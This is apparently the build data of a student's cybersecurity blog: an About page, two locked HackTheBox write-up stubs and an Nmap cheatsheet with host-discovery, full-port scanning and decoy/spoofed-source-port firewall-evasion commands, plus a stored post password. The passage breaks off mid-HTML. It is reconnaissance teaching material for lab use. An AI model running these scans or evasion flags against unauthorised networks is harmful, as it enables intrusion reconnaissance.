[["Map",1,2,9,10,32,33],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.13.10","content-config-digest","f6123819eadf773a","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://fuwari.vercel.app/\",\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"always\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":false,\"port\":4321,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image/\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[],\"responsiveStyles\":false},\"devToolbar\":{\"enabled\":true},\"markdown\":{\"syntaxHighlight\":false,\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[null,null,null,null,null,null,null],\"rehypePlugins\":[null,null,[null,{\"components\":{}}],[null,{\"behavior\":\"append\",\"properties\":{\"className\":[\"anchor\"]},\"content\":{\"type\":\"element\",\"tagName\":\"span\",\"properties\":{\"className\":[\"anchor-icon\"],\"data-pagefind-ignore\":true},\"children\":[{\"type\":\"text\",\"value\":\"#\"}]}}],[null,{\"themes\":[\"github-dark\",\"github-dark\"],\"plugins\":[{\"name\":\"Collapsible sections\",\"styleSettings\":{\"defaultValues\":{\"collapsibleSections\":{\"closedBorderWidth\":\"0\",\"closedPaddingBlock\":\"4px\",\"closedMargin\":\"0\",\"closedFontFamily\":\"inherit\",\"closedFontSize\":\"inherit\",\"closedLineHeight\":\"inherit\",\"openBorderWidth\":\"1px\",\"openPadding\":\"0\",\"openMargin\":\"0\",\"openBackgroundColor\":\"transparent\",\"openBorderColor\":\"transparent\",\"expandIcon\":\"url(\\\"data:image/svg+xml,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2016%2016'%3E%3Cpath%20d%3D'm8.177.677%202.896%202.896a.25.25%200%200%201-.177.427H8.75v1.25a.75.75%200%200%201-1.5%200V4H5.104a.25.25%200%200%201-.177-.427L7.823.677a.25.25%200%200%201%20.354%200ZM7.25%2010.75a.75.75%200%200%201%201.5%200V12h2.146a.25.25%200%200%201%20.177.427l-2.896%202.896a.25.25%200%200%201-.354%200l-2.896-2.896A.25.25%200%200%201%205.104%2012H7.25v-1.25Zm-5-2a.75.75%200%200%200%200-1.5h-.5a.75.75%200%200%200%200%201.5h.5ZM6%208a.75.75%200%200%201-.75.75h-.5a.75.75%200%200%201%200-1.5h.5A.75.75%200%200%201%206%208Zm2.25.75a.75.75%200%200%200%200-1.5h-.5a.75.75%200%200%200%200%201.5h.5ZM12%208a.75.75%200%200%201-.75.75h-.5a.75.75%200%200%201%200-1.5h.5A.75.75%200%200%201%2012%208Zm2.25.75a.75.75%200%200%200%200-1.5h-.5a.75.75%200%200%200%200%201.5h.5Z'%2F%3E%3C%2Fsvg%3E\\\")\",\"collapseIcon\":\"url(\\\"data:image/svg+xml,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2016%2016'%3E%3Cpath%20d%3D'M10.896%202H8.75V.75a.75.75%200%200%200-1.5%200V2H5.104a.25.25%200%200%200-.177.427l2.896%202.896a.25.25%200%200%200%20.354%200l2.896-2.896A.25.25%200%200%200%2010.896%202ZM8.75%2015.25a.75.75%200%200%201-1.5%200V14H5.104a.25.25%200%200%201-.177-.427l2.896-2.896a.25.25%200%200%201%20.354%200l2.896%202.896a.25.25%200%200%201-.177.427H8.75v1.25Zm-6.5-6.5a.75.75%200%200%200%200-1.5h-.5a.75.75%200%200%200%200%201.5h.5ZM6%208a.75.75%200%200%201-.75.75h-.5a.75.75%200%200%201%200-1.5h.5A.75.75%200%200%201%206%208Zm2.25.75a.75.75%200%200%200%200-1.5h-.5a.75.75%200%200%200%200%201.5h.5ZM12%208a.75.75%200%200%201-.75.75h-.5a.75.75%200%200%201%200-1.5h.5A.75.75%200%200%201%2012%208Zm2.25.75a.75.75%200%200%200%200-1.5h-.5a.75.75%200%200%200%200%201.5h.5Z'%2F%3E%3C%2Fsvg%3E\\\")\"}},\"cssVarExclusions\":[],\"cssVarReplacements\":[[\"collapsibleSections\",\"cs\"]],\"preventUnitlessValues\":[\"collapsibleSections.closedBorderWidth\",\"collapsibleSections.openBorderWidth\"]},\"hooks\":{}},{\"name\":\"Line numbers\",\"styleSettings\":{\"defaultValues\":{\"lineNumbers\":{\"foreground\":\"inherit\",\"highlightForeground\":\"inherit\"}},\"cssVarExclusions\":[],\"cssVarReplacements\":[],\"preventUnitlessValues\":[]},\"hooks\":{}},{\"name\":\"Language Badge\"},{\"name\":\"Custom Copy Button\",\"hooks\":{}},{\"name\":\"astro-expressive-code\",\"hooks\":{}}],\"defaultProps\":{\"wrap\":true,\"overridesByLang\":{\"shellsession\":{\"showLineNumbers\":false}}},\"styleOverrides\":{\"codeBackground\":\"var(--codeblock-bg)\",\"borderRadius\":\"0.75rem\",\"borderColor\":\"none\",\"codeFontSize\":\"0.875rem\",\"codeFontFamily\":\"'JetBrains Mono Variable', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace\",\"codeLineHeight\":\"1.5rem\",\"frames\":{\"editorBackground\":\"var(--codeblock-bg)\",\"terminalBackground\":\"var(--codeblock-bg)\",\"terminalTitlebarBackground\":\"var(--codeblock-topbar-bg)\",\"editorTabBarBackground\":\"var(--codeblock-topbar-bg)\",\"editorActiveTabBackground\":\"none\",\"editorActiveTabIndicatorBottomColor\":\"var(--primary)\",\"editorActiveTabIndicatorTopColor\":\"none\",\"editorTabBarBorderBottomColor\":\"var(--codeblock-topbar-bg)\",\"terminalTitlebarBorderBottomColor\":\"none\"},\"textMarkers\":{\"delHue\":0,\"insHue\":180,\"markHue\":250}},\"frames\":{\"showCopyToClipboardButton\":false}}]],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false,\"liveContentCollections\":false,\"csp\":false,\"staticImportMetaEnv\":false,\"chromeDevtoolsWorkspace\":false},\"legacy\":{\"collections\":false}}","spec",["Map",11,12],"about",{"id":11,"data":13,"body":14,"filePath":15,"digest":16,"rendered":17,"legacyId":31},{},"# About me\n\n```bash\nwhoami\nDelorian\n```\n\nHi, I'm a cybersecurity student (🇵🇹/🇪🇸), and I created this site to share my **HackTheBox** write-ups, certification experiences, blogs and so on — a platform where I spend most of my time learning, solving **CTFs**, and most importantly, having fun exploring new skills.\n\nI also own the [Kurogen Guild](https://discord.gg/feaadNXQS9) which is a *offensive cybersecurity* guild where we focus on trying the latest *CTF challenges* and **HackTheBox** machines in group\n\nCurrently (2025) I'm attending High School while studying *red teaming* at the same time, by the next years I'm planning to obtain a *Cybersecurity Bachelors degree*.\n\n&#x20;I hold the *Certified Professional Penetration Tester* (`eCPPT`) and the *Junior Penetration Tester* (`eJPT`) certifications, I've owned both of these certs in summer 2025 because of the free time I had and now I'm preparing for both `CRTP` and `CWES`.\n\n> As I plan to keep going on achieving certs, this is my cert roadmap so far:\n\n\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FsGbITSh6cuKcF8jMx3g1%2Fimage.png?alt=media&#x26;token=65b0a03c-3602-44e5-ba9f-38d04122170d\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>","src/content/spec/about.md","a7fcb3296faa5943",{"html":18,"metadata":19},"\u003Csection>\u003Ch1 id=\"about-me\">About me\u003Ca class=\"anchor\" href=\"#about-me\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h1>\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.4fsv9.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.g1fg5.js\">\u003C/script>\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:8ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">whoami\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Delorian\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Hi, I’m a cybersecurity student (🇵🇹/🇪🇸), and I created this site to share my \u003Cstrong>HackTheBox\u003C/strong> write-ups, certification experiences, blogs and so on — a platform where I spend most of my time learning, solving \u003Cstrong>CTFs\u003C/strong>, and most importantly, having fun exploring new skills.\u003C/p>\u003Cp>I also own the \u003Ca href=\"https://discord.gg/feaadNXQS9\">Kurogen Guild\u003C/a> which is a \u003Cem>offensive cybersecurity\u003C/em> guild where we focus on trying the latest \u003Cem>CTF challenges\u003C/em> and \u003Cstrong>HackTheBox\u003C/strong> machines in group\u003C/p>\u003Cp>Currently (2025) I’m attending High School while studying \u003Cem>red teaming\u003C/em> at the same time, by the next years I’m planning to obtain a \u003Cem>Cybersecurity Bachelors degree\u003C/em>.\u003C/p>\u003Cp> I hold the \u003Cem>Certified Professional Penetration Tester\u003C/em> (\u003Ccode>eCPPT\u003C/code>) and the \u003Cem>Junior Penetration Tester\u003C/em> (\u003Ccode>eJPT\u003C/code>) certifications, I’ve owned both of these certs in summer 2025 because of the free time I had and now I’m preparing for both \u003Ccode>CRTP\u003C/code> and \u003Ccode>CWES\u003C/code>.\u003C/p>\u003Cblockquote>\n\u003Cp>As I plan to keep going on achieving certs, this is my cert roadmap so far:\u003C/p>\n\u003C/blockquote>\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FsGbITSh6cuKcF8jMx3g1%2Fimage.png?alt=media&#x26;token=65b0a03c-3602-44e5-ba9f-38d04122170d\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\u003C/section>",{"headings":20,"localImagePaths":25,"remoteImagePaths":26,"frontmatter":27,"imagePaths":30},[21],{"depth":22,"slug":23,"text":24},1,"about-me","About me#",[],[],{"minutes":22,"words":28,"excerpt":29},152,"Hi, I’m a cybersecurity student (🇵🇹/🇪🇸), and I created this site to share my HackTheBox write-ups, certification experiences, blogs and so on — a platform where I spend most of my time learning, solving CTFs, and most importantly, having fun exploring new skills.",[],"about.md","posts",["Map",34,35,69,70,98,99,153,154,231,232,275,276,322,323],"darkzero",{"id":34,"data":36,"body":48,"filePath":49,"digest":50,"rendered":51,"legacyId":68},{"title":37,"published":38,"draft":39,"description":40,"image":41,"tags":42,"category":46,"lang":47,"prevTitle":47,"prevSlug":47,"nextTitle":47,"nextSlug":47},"HTB DarkZero",["Date","2025-10-10T00:00:00.000Z"],false,"Darkzero is a Windows Active Directory hard machine of season 9, we will learn MSSQL | 2025 CVE | Persistence | Cross-Forest Abuse | Pivoting | Unconstrained Delegation abuse | DCSync...","https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/78acdd0d87ed629f6cd2dc378bdcddac.png",[43,44,45],"Active Directory","Hard","HackTheBox","Writeup","","# DarkZero\n\n## ALERT\n\n> This Write-Up is being protected by `HackTheBox` since it's an active machine on Season 9\n> Once the active is retired, this write-up will be publicly visible","src/content/posts/darkzero.md","a92369397d51d932",{"html":52,"metadata":53},"\u003Csection>\u003Ch1 id=\"darkzero\">DarkZero\u003Ca class=\"anchor\" href=\"#darkzero\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h1>\u003Csection>\u003Ch2 id=\"alert\">ALERT\u003Ca class=\"anchor\" href=\"#alert\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cblockquote>\n\u003Cp>This Write-Up is being protected by \u003Ccode>HackTheBox\u003C/code> since it’s an active machine on Season 9\nOnce the active is retired, this write-up will be publicly visible\u003C/p>\n\u003C/blockquote>\u003C/section>\u003C/section>",{"headings":54,"localImagePaths":61,"remoteImagePaths":62,"frontmatter":63,"imagePaths":67},[55,57],{"depth":22,"slug":34,"text":56},"DarkZero#",{"depth":58,"slug":59,"text":60},2,"alert","ALERT#",[],[],{"title":37,"published":64,"description":40,"image":41,"tags":65,"category":46,"draft":39,"minutes":22,"words":66,"excerpt":47},["Date","2025-10-10T00:00:00.000Z"],[43,44,45],26,[],"darkzero.md","imagery",{"id":69,"data":71,"body":80,"filePath":81,"digest":82,"rendered":83,"legacyId":97},{"title":72,"published":73,"draft":39,"description":74,"image":75,"tags":76,"category":46,"lang":47,"prevTitle":47,"prevSlug":47,"nextTitle":47,"nextSlug":47},"HTB Imagery",["Date","2025-10-05T00:00:00.000Z"],"Imagery is a Linux medium machine of season 9, we will learn Stored XSS | LFI | Backend Enumeration | Code Review | OS Command Injection | AES Decryption | Script developement | Abusing charcol","https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/662ccbe3935d62aee031d620014adac4.png",[77,78,45,79],"Linux","Medium","Web Hacking","# Imagery\n\n\n## ALERT\n\n> This Write-Up is being protected by `HackTheBox` since it's an active machine on Season 9\n> Once the active is retired, this write-up will be publicly visible","src/content/posts/imagery.md","54df8ded44bc2897",{"html":84,"metadata":85},"\u003Csection>\u003Ch1 id=\"imagery\">Imagery\u003Ca class=\"anchor\" href=\"#imagery\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h1>\u003Csection>\u003Ch2 id=\"alert\">ALERT\u003Ca class=\"anchor\" href=\"#alert\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cblockquote>\n\u003Cp>This Write-Up is being protected by \u003Ccode>HackTheBox\u003C/code> since it’s an active machine on Season 9\nOnce the active is retired, this write-up will be publicly visible\u003C/p>\n\u003C/blockquote>\u003C/section>\u003C/section>",{"headings":86,"localImagePaths":90,"remoteImagePaths":91,"frontmatter":92,"imagePaths":96},[87,89],{"depth":22,"slug":69,"text":88},"Imagery#",{"depth":58,"slug":59,"text":60},[],[],{"title":72,"published":93,"description":74,"image":75,"tags":94,"category":46,"draft":39,"password":95,"minutes":22,"words":66,"excerpt":47},["Date","2025-10-05T00:00:00.000Z"],[77,78,45,79],"delorianprotected",[],"imagery.md","nmap",{"id":98,"data":100,"body":110,"filePath":111,"digest":112,"rendered":113,"legacyId":152},{"title":101,"published":102,"draft":39,"description":103,"image":104,"tags":105,"category":106,"lang":47,"prevTitle":47,"prevSlug":47,"nextTitle":47,"nextSlug":47},"Nmap Cheatsheet",["Date","2025-07-16T00:00:00.000Z"],"In this Post you'll learn everything you need to know about enumeration using Nmap with a broad cheatsheet","https://assets.tryhackme.com/img/modules/nmap.png",[106,107,108,77,109],"Cheatsheet","Nmap","Commands","Tools","# Nmap\n\n## Multiple Target\n\n### Host Discovery\n\n\nInitial Host Discovery\n```bash\nnmap -sn \u003CIP>/24 -oG hosts.gnmap\n```\n\nExport hosts into a hostlist \n```bash\ngrep \"Up\" hosts.gnmap | awk '{print $2}' > hosts.txt\n```\n\n### Port Scan\n\n\n\nPort scan\n```bash\nnmap -sS -p- --open -Pn -n --min-rate 5000 -iL hosts.txt -oN ports.txt\n```\n\nParse ports to a -p\u003Cports> format\n```bash\ngrep '^[0-9]' ports.txt | cut -d '/' -f1 | sort -u | xargs | tr '' ','\n```\nService and Version and NSE Detection Scan\n```bash\nnmap -sCV --open -Pn -p\u003Cports> -iL hosts.txt -oN scan.txt\n```\n\n## Single Target scan\n\n### TCP Port Scan\n\n```bash\nnmap -p- --open -Pn -n --min-rate 5000 -sS \u003CIP> -oN ports\n```\n\n### Parse open ports\n\n\nAdd this function to .bashrc or .zshrc (Credits to S4vitar)\n```bash\nextractPorts () {\n\tports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')\" \n\tip_address=\"$(cat $1 | grep -oP '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' | sort -u | head -n 1)\" \n\techo -e \"\\n[*] Extracting information...\\n\" > extractPorts.tmp\n\techo -e \"\\t[*] IP Address: $ip_address\" >> extractPorts.tmp\n\techo -e \"\\t[*] Open ports: $ports\\n\" >> extractPorts.tmp\n\techo $ports | tr -d '\\n' | xclip -sel clip\n\techo -e \"[*] Ports copied to clipboard\\n\" >> extractPorts.tmp\n\tbatcat extractPorts.tmp\n\trm extractPorts.tmp\n}\n```\nThen do\n```bash\nextractPorts \u003Cports file>\n```\n\n### Service/Version scan on open ports\n\n```bash\nnmap -p\u003Cports> -sCV -Pn \u003CIP>\n```\n\n## Firewall Evasion\n\n```bash\nsudo nmap -sCV -sS -Pn -n -p- \u003CIP> --disable-arp-ping --source-port 53 -D RND:2\n```","src/content/posts/nmap.md","369c8afad4ce32d8",{"html":114,"metadata":115},"\u003Csection>\u003Ch1 id=\"nmap\">Nmap\u003Ca class=\"anchor\" href=\"#nmap\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h1>\u003Csection>\u003Ch2 id=\"multiple-target\">Multiple Target\u003Ca class=\"anchor\" href=\"#multiple-target\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Csection>\u003Ch3 id=\"host-discovery\">Host Discovery\u003Ca class=\"anchor\" href=\"#host-discovery\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cp>Initial Host Discovery\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.4fsv9.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.g1fg5.js\">\u003C/script>\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:32ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;IP>/24\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-oG\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">hosts.gnmap\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Export hosts into a hostlist\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:52ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">grep\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"Up\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">hosts.gnmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">awk\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'{print $2}'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">hosts.txt\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch3 id=\"port-scan\">Port Scan\u003Ca class=\"anchor\" href=\"#port-scan\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cp>Port scan\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:70ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sS\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Pn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-n\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--min-rate\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">5000\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-iL\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">hosts.txt\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-oN\u003C/span>\u003Cspan 